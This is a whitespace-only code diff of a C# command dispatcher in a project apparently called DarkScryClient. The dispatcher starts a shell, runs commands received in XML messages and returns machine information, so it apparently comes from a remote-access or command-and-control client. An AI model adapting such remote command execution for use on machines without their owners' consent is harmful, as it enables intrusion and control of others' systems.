@@ -42,6 +42,7 @@ namespace DarkScryClient.Client
 						_CShellServicecs = new CSShellServicecs();	
 					}
 					return PackCommand("Success", CommandIdentifiers.START_SHELL_INSTANCE, 0);
+
 				case CommandIdentifiers.RUN_COMMAND:
 					if (!Info.IsMainShellRuning)
 					{
@@ -50,6 +51,7 @@ namespace DarkScryClient.Client
 					string command = xmlDoc.SelectSingleNode("/root/command").InnerText;
 					string output = _CShellServicecs.RunCommand(command);
 					return PackCommand(output, action, 0);
+
 				case CommandIdentifiers.GET_BASIC_MACHINE_INFO:
 					var bmi = MachineInfo.BasicMachineInfoRetriever.GetBasicMachineInfo();
 					return Tools.StringToBytes(JsonSerializer.Serialize(bmi));
@@ -60,7 +62,7 @@ namespace DarkScryClient.Client
 
 		private byte[] PackCommand(string output, string type, int status) 
 		{
-			Models.CommandOutput model = new Models.CommandOutput { output = output, type=type, status=status };
+			Models.CommandOutput model = new Models.CommandOutput { output = output, type = type, status = status };
 			return Tools.SerializeToJson(model);
 		}
 
